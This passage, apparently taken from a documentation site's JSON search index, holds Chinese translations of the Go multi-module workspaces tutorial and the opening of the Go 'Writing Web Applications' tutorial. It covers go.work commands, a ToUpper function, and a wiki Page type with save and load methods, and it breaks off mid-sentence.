\u514b\u9686\u5b58\u50a8\u5e93 \u5728 workspace \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c git \u547d\u4ee4\u514b\u9686\u5b58\u50a8\u5e93\uff1a $ git clone https://go.googlesource.com/example Cloning into 'example'... remote: Total 165 (delta 27), reused 165 (delta 27) Receiving objects: 100% (165/165), 434.18 KiB | 1022.00 KiB/s, done. Resolving deltas: 100% (27/27), done. \u5c06 example \u6a21\u5757\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a $ go work use ./example \u8be5 go work use \u547d\u4ee4\u5c06\u4e00\u4e2a\u65b0\u6a21\u5757\u6dfb\u52a0\u5230 go.work \u6587\u4ef6\u4e2d\u3002\u5b83\u73b0\u5728\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a go 1.18 use ( ./hello ./example ) \u6a21\u5757\u73b0\u5728\u5305\u62ec example.com/hello \u6a21\u5757\u548c golang.org/x/example \u6a21\u5757\u3002 \u8fd9\u5c06\u5141\u8bb8\u6211\u4eec\u4f7f\u7528\u6211\u4eec\u5c06\u5728 stringutil \u6a21\u5757\u526f\u672c\u4e2d\u7f16\u5199\u7684\u65b0\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u547d\u4ee4 go get \u4e0b\u8f7d\u7684\u6a21\u5757\u7f13\u5b58\u4e2d\u7684\u6a21\u5757\u7248\u672c\u3002 \u6dfb\u52a0\u65b0\u51fd\u6570 \u6211\u4eec\u5c06\u5411 golang.org/x/example/stringutil \u5305\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u51fd\u6570\u4ee5\u5c06\u5b57\u7b26\u4e32\u5927\u5199\u3002 \u5728\u76ee\u5f55 workspace/example/stringutil \u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a toupper.go \u7684\u65b0\u6587\u4ef6\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a package stringutil import \"unicode\" // ToUpper uppercases all the runes in its argument string. func ToUpper(s string) string { r := []rune(s) for i := range r { r[i] = unicode.ToUpper(r[i]) } return string(r) } \u4fee\u6539hello\u7a0b\u5e8f\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570\u3002 \u4fee\u6539 workspace/hello/hello.go \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b: package main import ( \"fmt\" \"golang.org/x/example/stringutil\" ) func main() { fmt.Println(stringutil.ToUpper(\"Hello\")) } \u5728workspace\u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c\u4ee3\u7801 $ go run example.com/hello HELLO Go \u547d\u4ee4\u5728\u6587\u4ef6 go.work \u6307\u5b9a\u7684\u76ee\u5f55 hello \u4e2d\u67e5\u627e\u547d\u4ee4\u884c\u4e2d\u6307\u5b9a\u7684\u6a21\u5757 example.com/hello \uff0c\u540c\u6837\u4f7f\u7528\u6587\u4ef6 go.work \u89e3\u6790\u5bfc\u5165 golang.org/x/example \u3002 go.work \u53ef\u4ee5\u7528\u6765\u4ee3\u66ff\u6dfb\u52a0 replace \u6307\u4ee4\u4ee5\u8de8\u591a\u4e2a\u6a21\u5757\u5de5\u4f5c\u3002 \u7531\u4e8e\u8fd9\u4e24\u4e2a\u6a21\u5757\u5728\u540c\u4e00\u4e2a\u5de5\u4f5c\u533a\u4e2d\uff0c\u56e0\u6b64\u5f88\u5bb9\u6613\u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\u8fdb\u884c\u66f4\u6539\u5e76\u5728\u53e6\u4e00\u4e2a\u6a21\u5757\u4e2d\u4f7f\u7528\u5b83\u3002 \u672a\u6765\u7684\u4e00\u6b65 \u73b0\u5728\uff0c\u8981\u6b63\u786e\u53d1\u5e03\u8fd9\u4e9b\u6a21\u5757\uff0c\u6211\u4eec\u9700\u8981\u53d1\u5e03 golang.org/x/example \u6a21\u5757\uff0c\u4f8b\u5982\u5728 v0.1.0 \u3002\u8fd9\u901a\u5e38\u901a\u8fc7\u5728\u6a21\u5757\u7684\u7248\u672c\u63a7\u5236\u5b58\u50a8\u5e93\u4e0a\u6807\u8bb0\u63d0\u4ea4\u6765\u5b8c\u6210\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u6a21\u5757\u53d1\u5e03\u5de5\u4f5c\u6d41\u7a0b\u6587\u6863 \u3002\u53d1\u5e03\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 hello/go.mod \u4e2d\u589e\u52a0\u5bf9 golang.org/x/example \u6a21\u5757\u7684\u8981\u6c42\uff1a cd hello go get golang.org/x/example@v0.1.0 \u8fd9\u6837\uff0c\u8be5go\u547d\u4ee4\u53ef\u4ee5\u6b63\u786e\u89e3\u6790\u5de5\u4f5c\u533a\u4e4b\u5916\u7684\u6a21\u5757\u3002 \u4e86\u89e3\u6709\u5173\u5de5\u4f5c\u533a\u7684\u66f4\u591a\u4fe1\u606f \uf0c1 \u9664\u4e86\u6211\u4eec\u5728\u6559\u7a0b\u524d\u9762\u770b\u5230\u7684 go work init \u4e4b\u5916\uff0cgo\u547d\u4ee4\u8fd8\u6709\u51e0\u4e2a\u7528\u4e8e\u5904\u7406\u5de5\u4f5c\u533a\u7684\u5b50\u547d\u4ee4\uff1a go work use [-r] [dir] \u5982\u679c\u76ee\u5f55 dir \u5b58\u5728\uff0c\u5219\u5c06 use \u6307\u4ee4\u6dfb\u52a0\u5230\u6587\u4ef6 go.work \u4e2d\uff0c\u5982\u679c\u53c2\u6570\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u5220\u9664\u8be5 use \u76ee\u5f55\u3002\u6807\u5fd7 -r \u9012\u5f52\u5730\u68c0\u67e5 dir \u5b50\u76ee\u5f55\u3002 go work edit \u7f16\u8f91 go.work \u6587\u4ef6\u7c7b\u4f3c\u4e8e go mod edit go work sync \u5c06\u5de5\u4f5c\u533a\u6784\u5efa\u5217\u8868\u4e2d\u7684\u4f9d\u8d56\u9879\u540c\u6b65\u5230\u6bcf\u4e2a\u5de5\u4f5c\u533a\u6a21\u5757\u4e2d\u3002 \u6709\u5173workspaces(\u5de5\u4f5c\u533a)\u548c go.work \u6587\u4ef6\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go Modules Reference \u4e2d\u7684 Workspaces \u3002 \u53c2\u8003\u8d44\u6599 \uf0c1 https://go.dev/doc/tutorial/workspaces","title":"Workspaces"},{"location":"go/workspaces/#multi-module-workspace","text":"\u4f7f\u7528\u591a\u6a21\u5757\u5de5\u4f5c\u533a\uff0c\u544a\u8bc9 Go \u547d\u4ee4\u60a8\u6b63\u5728\u540c\u65f6\u5728\u591a\u4e2a\u6a21\u5757\u4e2d\u7f16\u5199\u4ee3\u7801\uff0c\u5e76\u8f7b\u677e\u5730\u5728\u8fd9\u4e9b\u6a21\u5757\u4e2d\u6784\u5efa\u548c\u8fd0\u884c\u4ee3\u7801\u3002 \u5728\u672c\u6559\u7a0b\u4e2d\uff0c\u60a8\u5c06\u5728\u5171\u4eab\u7684\u591a\u6a21\u5757\u5de5\u4f5c\u533a\u4e2d\u521b\u5efa\u4e24\u4e2a\u6a21\u5757\uff0c\u5bf9\u8fd9\u4e9b\u6a21\u5757\u8fdb\u884c\u66f4\u6539\uff0c\u5e76\u5728\u6784\u5efa\u4e2d\u67e5\u770b\u8fd9\u4e9b\u66f4\u6539\u7684\u7ed3\u679c\u3002 \u672c\u6559\u7a0b\u9700\u8981 go 1.18 \u6216\u66f4\u9ad8\u7248\u672c\u3002","title":"\u591a\u6a21\u5757\u5de5\u4f5c\u533a"},{"location":"go/workspaces/#create-module","text":"\u6253\u5f00\u547d\u4ee4\u63d0\u793a\u7b26\u5e76\u5207\u6362\u5230\u60a8\u7684\u4e3b\u76ee\u5f55\uff0c\u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a\u5de5\u4f5c\u533a\u7684\u76ee\u5f55\u3002 $ mkdir workspace $ cd workspace \u521d\u59cb\u5316\u6a21\u5757 \u521b\u5efa\u4e00\u4e2a\u4f9d\u8d56\u4e8e golang.org/x/example \u6a21\u5757\u7684\u65b0\u6a21\u5757 hello \u3002 $ mkdir hello $ cd hello $ go mod init example.com/hello go: creating new go.mod: module example.com/hello \u4f7f\u7528 go get \u547d\u4ee4\u6dfb\u52a0\u5bf9 golang.org/x/example \u6a21\u5757\u7684\u4f9d\u8d56\u9879\u3002 $ go get golang.org/x/example \u5728 hello \u76ee\u5f55\u4e0b\u521b\u5efa hello.go\uff0c\u5185\u5bb9\u5982\u4e0b\uff1a package main import ( \"fmt\" \"golang.org/x/example/stringutil\" ) func main() { fmt.Println(stringutil.Reverse(\"Hello\")) } \u8fd0\u884chello\u7a0b\u5e8f\uff1a $ go run example.com/hello olleH","title":"\u521b\u5efa\u4e00\u4e2a\u6a21\u5757"},{"location":"go/workspaces/#create-workspace","text":"\u5728\u8fd9\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5c06\u521b\u5efa\u4e00\u4e2a go.work \u6587\u4ef6\u6765\u6307\u5b9a\u6a21\u5757\u7684\u5de5\u4f5c\u533a\u3002 \u521d\u59cb\u5316\u5de5\u4f5c\u533a \u5728 workspace \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a $ go work init ./hello \u8be5 go work init \u547d\u4ee4\u544a\u8bc9 go \u4e3a\u5de5\u4f5c\u7a7a\u95f4\u4e2d\u5305\u542b\u5728\u76ee\u5f55 ./hello \u7684\u6a21\u5757\u521b\u5efa\u4e00\u4e2a go.work \u6587\u4ef6\u3002 \u8be5 go \u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u5982\u4e0b\u6240\u793a\u7684\u6587\u4ef6 go.work \uff1a go 1.18 use ./hello \u8be5 go.work \u6587\u4ef6\u7684\u8bed\u6cd5\u4e0e go.mod \u76f8\u4f3c\u3002 \u8be5 go \u6307\u4ee4\u544a\u8bc9 Go \u5e94\u8be5\u4f7f\u7528\u54ea\u4e2a\u7248\u672c\u7684 Go \u6765\u89e3\u91ca\u6587\u4ef6\u3002\u5b83\u7c7b\u4f3c\u4e8e go.mod \u6587\u4ef6\u4e2d\u7684go\u6307\u4ee4\u3002 \u8be5 use \u6307\u4ee4\u544a\u8bc9 Go \u5728\u8fdb\u884c\u6784\u5efa\u65f6\u76ee\u5f55 hello \u4e2d\u7684\u6a21\u5757\u5e94\u8be5\u662f\u4e3b\u6a21\u5757\u3002 \u6240\u4ee5\u5728 workspace \u7684\u4efb\u4f55\u5b50\u76ee\u5f55\u4e2d\u6a21\u5757\u90fd\u4f1a\u88ab\u6fc0\u6d3b\u3002 \u8fd0\u884c\u5de5\u4f5c\u533a\u76ee\u5f55\u4e0b\u7684\u7a0b\u5e8f \u5728workspace\u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c\uff1a $ go run example.com/hello olleH Go \u547d\u4ee4\u5305\u62ec\u5de5\u4f5c\u533a\u4e2d\u7684\u6240\u6709\u6a21\u5757\u4f5c\u4e3a\u4e3b\u6a21\u5757\u3002\u8fd9\u5141\u8bb8\u6211\u4eec\u5728\u6a21\u5757\u4e2d\u5f15\u7528\u4e00\u4e2a\u5305\uff0c\u751a\u81f3\u5728\u6a21\u5757\u4e4b\u5916\u3002\u5728\u6a21\u5757\u6216\u5de5\u4f5c\u533a\u4e4b\u5916\u8fd0\u884c go run \u547d\u4ee4\u4f1a\u5bfc\u81f4\u9519\u8bef\uff0c\u56e0\u4e3a\u8be5 go \u547d\u4ee4\u4e0d\u77e5\u9053\u8981\u4f7f\u7528\u54ea\u4e9b\u6a21\u5757\u3002 \u63a5\u4e0b\u6765\uff0c\u6211\u4eec\u5c06 golang.org/x/example \u6a21\u5757\u7684\u672c\u5730\u526f\u672c\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a\u3002\u7136\u540e\uff0c\u6211\u4eec\u5c06\u5411 stringutil \u5305\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u51fd\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5b83\u6765\u4ee3\u66ff Reverse .","title":"\u521b\u5efa\u5de5\u4f5c\u533a"},{"location":"go/workspaces/#download-and-modify-example","text":"\u5728\u8fd9\u4e00\u6b65\u4e2d\uff0c\u6211\u4eec\u5c06\u4e0b\u8f7d\u5305\u542b golang.org/x/example \u6a21\u5757\u7684 Git \u5b58\u50a8\u5e93\u7684\u526f\u672c\uff0c\u5c06\u5176\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a\uff0c\u7136\u540e\u5411\u5176\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u6211\u4eec\u5c06\u4ece hello \u7a0b\u5e8f\u4e2d\u4f7f\u7528\u7684\u65b0\u51fd\u6570\u3002 \u514b\u9686\u5b58\u50a8\u5e93 \u5728 workspace \u76ee\u5f55\u4e2d\uff0c\u8fd0\u884c git \u547d\u4ee4\u514b\u9686\u5b58\u50a8\u5e93\uff1a $ git clone https://go.googlesource.com/example Cloning into 'example'... remote: Total 165 (delta 27), reused 165 (delta 27) Receiving objects: 100% (165/165), 434.18 KiB | 1022.00 KiB/s, done. Resolving deltas: 100% (27/27), done. \u5c06 example \u6a21\u5757\u6dfb\u52a0\u5230\u5de5\u4f5c\u533a $ go work use ./example \u8be5 go work use \u547d\u4ee4\u5c06\u4e00\u4e2a\u65b0\u6a21\u5757\u6dfb\u52a0\u5230 go.work \u6587\u4ef6\u4e2d\u3002\u5b83\u73b0\u5728\u770b\u8d77\u6765\u50cf\u8fd9\u6837\uff1a go 1.18 use ( ./hello ./example ) \u6a21\u5757\u73b0\u5728\u5305\u62ec example.com/hello \u6a21\u5757\u548c golang.org/x/example \u6a21\u5757\u3002 \u8fd9\u5c06\u5141\u8bb8\u6211\u4eec\u4f7f\u7528\u6211\u4eec\u5c06\u5728 stringutil \u6a21\u5757\u526f\u672c\u4e2d\u7f16\u5199\u7684\u65b0\u4ee3\u7801\uff0c\u800c\u4e0d\u662f\u4f7f\u7528\u547d\u4ee4 go get \u4e0b\u8f7d\u7684\u6a21\u5757\u7f13\u5b58\u4e2d\u7684\u6a21\u5757\u7248\u672c\u3002 \u6dfb\u52a0\u65b0\u51fd\u6570 \u6211\u4eec\u5c06\u5411 golang.org/x/example/stringutil \u5305\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u65b0\u51fd\u6570\u4ee5\u5c06\u5b57\u7b26\u4e32\u5927\u5199\u3002 \u5728\u76ee\u5f55 workspace/example/stringutil \u4e2d\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a toupper.go \u7684\u65b0\u6587\u4ef6\uff0c\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a package stringutil import \"unicode\" // ToUpper uppercases all the runes in its argument string. func ToUpper(s string) string { r := []rune(s) for i := range r { r[i] = unicode.ToUpper(r[i]) } return string(r) } \u4fee\u6539hello\u7a0b\u5e8f\u4ee5\u4f7f\u7528\u8be5\u51fd\u6570\u3002 \u4fee\u6539 workspace/hello/hello.go \u6587\u4ef6\uff0c\u5185\u5bb9\u5982\u4e0b: package main import ( \"fmt\" \"golang.org/x/example/stringutil\" ) func main() { fmt.Println(stringutil.ToUpper(\"Hello\")) } \u5728workspace\u76ee\u5f55\u4e0b\uff0c\u8fd0\u884c\u4ee3\u7801 $ go run example.com/hello HELLO Go \u547d\u4ee4\u5728\u6587\u4ef6 go.work \u6307\u5b9a\u7684\u76ee\u5f55 hello \u4e2d\u67e5\u627e\u547d\u4ee4\u884c\u4e2d\u6307\u5b9a\u7684\u6a21\u5757 example.com/hello \uff0c\u540c\u6837\u4f7f\u7528\u6587\u4ef6 go.work \u89e3\u6790\u5bfc\u5165 golang.org/x/example \u3002 go.work \u53ef\u4ee5\u7528\u6765\u4ee3\u66ff\u6dfb\u52a0 replace \u6307\u4ee4\u4ee5\u8de8\u591a\u4e2a\u6a21\u5757\u5de5\u4f5c\u3002 \u7531\u4e8e\u8fd9\u4e24\u4e2a\u6a21\u5757\u5728\u540c\u4e00\u4e2a\u5de5\u4f5c\u533a\u4e2d\uff0c\u56e0\u6b64\u5f88\u5bb9\u6613\u5728\u4e00\u4e2a\u6a21\u5757\u4e2d\u8fdb\u884c\u66f4\u6539\u5e76\u5728\u53e6\u4e00\u4e2a\u6a21\u5757\u4e2d\u4f7f\u7528\u5b83\u3002 \u672a\u6765\u7684\u4e00\u6b65 \u73b0\u5728\uff0c\u8981\u6b63\u786e\u53d1\u5e03\u8fd9\u4e9b\u6a21\u5757\uff0c\u6211\u4eec\u9700\u8981\u53d1\u5e03 golang.org/x/example \u6a21\u5757\uff0c\u4f8b\u5982\u5728 v0.1.0 \u3002\u8fd9\u901a\u5e38\u901a\u8fc7\u5728\u6a21\u5757\u7684\u7248\u672c\u63a7\u5236\u5b58\u50a8\u5e93\u4e0a\u6807\u8bb0\u63d0\u4ea4\u6765\u5b8c\u6210\u3002\u6709\u5173\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u6a21\u5757\u53d1\u5e03\u5de5\u4f5c\u6d41\u7a0b\u6587\u6863 \u3002\u53d1\u5e03\u5b8c\u6210\u540e\uff0c\u6211\u4eec\u53ef\u4ee5\u5728 hello/go.mod \u4e2d\u589e\u52a0\u5bf9 golang.org/x/example \u6a21\u5757\u7684\u8981\u6c42\uff1a cd hello go get golang.org/x/example@v0.1.0 \u8fd9\u6837\uff0c\u8be5go\u547d\u4ee4\u53ef\u4ee5\u6b63\u786e\u89e3\u6790\u5de5\u4f5c\u533a\u4e4b\u5916\u7684\u6a21\u5757\u3002","title":"\u4e0b\u8f7d\u548c\u4fee\u6539golang.org/x/example\u6a21\u5757"},{"location":"go/workspaces/#learn-more-about-workspaces","text":"\u9664\u4e86\u6211\u4eec\u5728\u6559\u7a0b\u524d\u9762\u770b\u5230\u7684 go work init \u4e4b\u5916\uff0cgo\u547d\u4ee4\u8fd8\u6709\u51e0\u4e2a\u7528\u4e8e\u5904\u7406\u5de5\u4f5c\u533a\u7684\u5b50\u547d\u4ee4\uff1a go work use [-r] [dir] \u5982\u679c\u76ee\u5f55 dir \u5b58\u5728\uff0c\u5219\u5c06 use \u6307\u4ee4\u6dfb\u52a0\u5230\u6587\u4ef6 go.work \u4e2d\uff0c\u5982\u679c\u53c2\u6570\u76ee\u5f55\u4e0d\u5b58\u5728\uff0c\u5219\u5220\u9664\u8be5 use \u76ee\u5f55\u3002\u6807\u5fd7 -r \u9012\u5f52\u5730\u68c0\u67e5 dir \u5b50\u76ee\u5f55\u3002 go work edit \u7f16\u8f91 go.work \u6587\u4ef6\u7c7b\u4f3c\u4e8e go mod edit go work sync \u5c06\u5de5\u4f5c\u533a\u6784\u5efa\u5217\u8868\u4e2d\u7684\u4f9d\u8d56\u9879\u540c\u6b65\u5230\u6bcf\u4e2a\u5de5\u4f5c\u533a\u6a21\u5757\u4e2d\u3002 \u6709\u5173workspaces(\u5de5\u4f5c\u533a)\u548c go.work \u6587\u4ef6\u7684\u66f4\u591a\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Go Modules Reference \u4e2d\u7684 Workspaces \u3002","title":"\u4e86\u89e3\u6709\u5173\u5de5\u4f5c\u533a\u7684\u66f4\u591a\u4fe1\u606f"},{"location":"go/workspaces/#references","text":"https://go.dev/doc/tutorial/workspaces","title":"\u53c2\u8003\u8d44\u6599"},{"location":"go/writing_web_app/","text":"\u7f16\u5199 Web \u5e94\u7528\u7a0b\u5e8f \uf0c1 \u7f16\u5199 Web \u5e94\u7528\u7a0b\u5e8f \u672c\u6559\u7a0b\u6db5\u76d6\uff1a \u521b\u5efa\u5177\u6709\u52a0\u8f7d\u548c\u4fdd\u5b58\u65b9\u6cd5\u7684\u6570\u636e\u7ed3\u6784 \u4f7f\u7528 net/http \u5305\u6784\u5efa Web \u5e94\u7528\u7a0b\u5e8f \u4f7f\u7528 html/template \u5305\u5904\u7406 HTML \u6a21\u677f \u4f7f\u7528 regexp \u5305\u9a8c\u8bc1\u7528\u6237\u8f93\u5165 \u4f7f\u7528\u95ed\u5305 \u5047\u8bbe\u77e5\u8bc6\uff1a \u7f16\u7a0b\u7ecf\u9a8c \u4e86\u89e3\u57fa\u672c\u7684\u7f51\u7edc\u6280\u672f\uff08HTTP\u3001HTML\uff09 \u4e00\u4e9b UNIX/DOS \u547d\u4ee4\u884c\u77e5\u8bc6 \u4e3a\u60a8\u7684\u4ee3\u7801\u521b\u5efa\u4e00\u4e2a\u6587\u4ef6\u5939 \uf0c1 \u5728\u4f60\u7684 GOPATH \u4e2d\u4e3a\u672c\u6559\u7a0b\u521b\u5efa\u4e00\u4e2a\u65b0\u76ee\u5f55\uff1a $ mkdir gowiki $ cd gowiki \u521b\u5efa\u4e00\u4e2a\u540d\u4e3a wiki.go \u7684\u6587\u4ef6\uff0c\u5728\u60a8\u559c\u6b22\u7684\u7f16\u8f91\u5668\u4e2d\u6253\u5f00\u5b83\uff0c\u7136\u540e\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff1a package main import ( \"fmt\" \"os\" ) \u6211\u4eec\u4ece Go \u6807\u51c6\u5e93\u4e2d \u5bfc\u5165 fmt \u548c os \u5305\u3002\u7a0d\u540e\uff0c\u5f53\u6211\u4eec\u5b9e\u73b0\u9644\u52a0\u529f\u80fd\u65f6\uff0c\u6211\u4eec\u5c06\u5728\u6b64import\u58f0\u660e\u4e2d\u6dfb\u52a0\u66f4\u591a\u5305\u3002 \u6570\u636e\u7ed3\u6784 \uf0c1 \u8ba9\u6211\u4eec\u4ece\u5b9a\u4e49\u6570\u636e\u7ed3\u6784\u5f00\u59cb\u3002\u4e00\u4e2a wiki \u7531\u4e00\u7cfb\u5217\u76f8\u4e92\u5173\u8054\u7684\u9875\u9762\u7ec4\u6210\uff0c\u6bcf\u4e2a\u9875\u9762\u90fd\u6709\u4e00\u4e2a\u6807\u9898\u548c\u4e00\u4e2a\u6b63\u6587\uff08\u9875\u9762\u5185\u5bb9\uff09\u3002\u5728\u8fd9\u91cc\uff0c\u6211\u4eec\u5b9a\u4e49 Page \u4e3a\u4e00\u4e2a\u7ed3\u6784\u4f53\uff0c\u5176\u4e2d\u5305\u542b\u4e24\u4e2a\u5b57\u6bb5\uff0c\u5206\u522b\u4ee3\u8868\u6807\u9898\u548c\u6b63\u6587\u3002 type Page struct { Title string Body []byte } \u8be5\u7c7b\u578b\u7684 []byte \u610f\u601d\u662f\u201cbyte\u5207\u7247\u6570\u7ec4\u201d\u3002\uff08\u6709\u5173\u5207\u7247\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u5207\u7247\uff1a\u7528\u6cd5\u548c\u5185\u90e8 \u3002\uff09 Body \u5143\u7d20\u662f []byte \u800c\u4e0d\u662f string \uff0c\u56e0\u4e3a\u8fd9\u662f\u6211\u4eec\u5c06\u4f7f\u7528\u7684 io \u5e93\u6240\u671f\u671b\u7684\u7c7b\u578b\uff0c\u5982\u4e0b\u6240\u793a\u3002 \u8be5 Page \u7ed3\u6784\u63cf\u8ff0\u4e86\u9875\u9762\u6570\u636e\u5c06\u5982\u4f55\u5b58\u50a8\u5728\u5185\u5b58\u4e2d\u3002\u4f46\u662f\u6301\u4e45\u5b58\u50a8\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5728 Page \u4e0a\u521b\u5efa\u4e00\u4e2a save \u65b9\u6cd5\u6765\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\uff1a func (p *Page) save() error { filename := p.Title + \".txt\" return os.WriteFile(filename, p.Body, 0600) } \u8fd9\u4e2a\u65b9\u6cd5\u7684\u7b7e\u540d\u5199\u7740\uff1a\u201c\u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a save \u7684\u65b9\u6cd5\uff0c\u5b83\u7684\u63a5\u6536\u8005p\u662f\u4e00\u4e2a\u6307\u5411 Page \u7684\u6307\u9488\u3002\u5b83\u4e0d\u63a5\u53d7\u4efb\u4f55\u53c2\u6570\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a error \u7c7b\u578b\u7684\u503c\u3002\u201d \u6b64\u65b9\u6cd5\u4f1a\u5c06 Page's Body \u4fdd\u5b58\u5230\u6587\u672c\u6587\u4ef6\u4e2d\u3002\u4e3a\u7b80\u5355\u8d77\u89c1\uff0c\u6211\u4eec\u5c06\u4f7f\u7528 Title \u4f5c\u4e3a\u6587\u4ef6\u540d\u3002 \u8be5 save \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a error \u503c\uff0c\u56e0\u4e3a\u8fd9\u662f WriteFile \uff08\u5c06\u5b57\u8282\u5207\u7247\u5199\u5165\u6587\u4ef6\u7684\u6807\u51c6\u5e93\u51fd\u6570\uff09\u7684\u8fd4\u56de\u7c7b\u578b\u3002\u8be5 save \u65b9\u6cd5\u8fd4\u56de\u9519\u8bef\u503c\uff0c\u8ba9\u5e94\u7528\u7a0b\u5e8f\u5728\u5199\u5165\u6587\u4ef6\u51fa\u73b0\u4efb\u4f55\u95ee\u9898\u65f6\u5904\u7406\u5b83\u3002\u5982\u679c\u4e00\u5207\u987a\u5229\uff0c Page.save() \u5c06\u8fd4\u56de nil \uff08\u6307\u9488\u3001\u63a5\u53e3\u548c\u5176\u4ed6\u4e00\u4e9b\u7c7b\u578b\u7684\u96f6\u503c\uff09\u3002 \u516b\u8fdb\u5236\u6574\u6570\u6587\u5b57 0600 \uff0c\u4f5c\u4e3a\u7b2c\u4e09\u4e2a\u53c2\u6570\u4f20\u9012\u7ed9 WriteFile \uff0c\u8868\u793a\u521b\u5efa\u6587\u4ef6\u65f6\u5e94\u4ec5\u5bf9\u5f53\u524d\u7528\u6237\u5177\u6709\u8bfb\u5199\u6743\u9650\u3002\uff08\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 Unix man page open(2) \u3002\uff09 \u9664\u4e86\u4fdd\u5b58\u9875\u9762\uff0c\u6211\u4eec\u8fd8\u9700\u8981\u52a0\u8f7d\u9875\u9762\uff1a func loadPage(title string) *Page { filename := title + \".txt\" body, _ := os.ReadFile(filename) return &Page{Title: title, Body: body} } \u8be5\u51fd\u6570 loadPage \u4ece title \u53c2\u6570\u6784\u9020\u6587\u4ef6\u540d\uff0c\u5c06\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u5165\u4e00\u4e2a\u65b0\u53d8\u91cf body \uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u6307\u9488\uff0c\u6307\u5411\u7531\u6b63\u786e\u7684\u6807\u9898\u548c\u6b63\u6587\u503c\u6784\u9020\u7684 Page \u3002 \u51fd\u6570\u53ef\u4ee5\u8fd4\u56de\u591a\u4e2a\u503c\u3002\u6807\u51c6\u5e93\u51fd\u6570 os.ReadFile \u8fd4\u56de []byte \u548c error \u3002\u5728 loadPage \u4e2d\uff0c\u5c1a\u672a\u5904\u7406\u9519\u8bef\uff1b\u4e0b\u5212\u7ebf(_) \u7b26\u53f7\u8868\u793a\u7684\u201c\u7a7a\u767d\u6807\u8bc6\u7b26\u201d\u7528\u4e8e\u4e22\u5f03\u9519\u8bef\u8fd4\u56de\u503c\uff08\u672c\u8d28\u4e0a\uff0c\u5c06\u503c\u8d4b\u503c\u4e3a\u7a7a\uff09\u3002 \u4f46\u662f\u5982\u679c ReadFile \u9047\u5230\u9519\u8bef\u4f1a\u53d1\u751f\u4ec0\u4e48\uff1f\u4f8b\u5982\uff0c\u8be5\u6587\u4ef6\u53ef\u80fd\u4e0d\u5b58\u5728\u3002\u6211\u4eec\u4e0d\u5e94\u8be5\u5ffd\u89c6\u8fd9\u6837\u7684\u9519\u8bef\u3002\u8ba9\u6211\u4eec\u4fee\u6539\u51fd\u6570\u4ee5\u8fd4\u56de *Page \u548c error \u3002 func loadPage(title string) (*Page, error) { filename := title + \".txt\" body, err := os.ReadFile(filename) if err != nil { return nil, err } return &Page{Title: title, Body: body}, nil } \u8be5\u51fd\u6570\u7684\u8c03\u7528\u8005\u73b0\u5728\u53ef\u4ee5\u68c0\u67e5\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1b\u5982\u679c\u662f nil \u5219\u5b83\u5df2\u6210\u529f\u52a0\u8f7d\u9875\u9762\u3002\u5982\u679c\u4e0d\u662f\uff0c\u5b83\u5c06\u662f\u53ef\u4ee5\u7531\u8c03\u7528\u8005\u5904\u7406\u7684 error \uff08\u6709\u5173\u8be6\u7ec6\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 \u8bed\u8a00\u89c4\u8303 \uff09\u3002 \u5728\u8fd9\u4e00\u70b9\u4e0a\uff0c\u6211\u4eec\u6709\u4e00\u4e2a\u7b80\u5355\u7684\u6570\u636e\u7ed3\u6784\u548c\u4fdd\u5b58\u5230\u6587\u4ef6\u548c\u4ece\u6587\u4ef6\u52a0\u8f7d\u7684\u80fd\u529b\u3002\u8ba9\u6211\u4eec\u7f16\u5199\u4e00\u4e2a main \u51fd\u6570\u6765\u6d4b\u8bd5\u6211\u4eec\u6240\u5199\u7684\u5185\u5bb9\uff1a func main() { p1 := &Page{Title: \"TestPage\", Body: []byte(\"This is a sample Page.\")} p1.save() p2, _ := loadPage(\"TestPage\") fmt.Println(string(p2.Body)) } \u7f16\u8bd1\u5e76\u6267\u884c\u6b64\u4ee3\u7801\u540e\uff0c\u5c06\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a TestPage.txt \u7684\u6587\u4ef6\uff0c\u5305\u542b p1 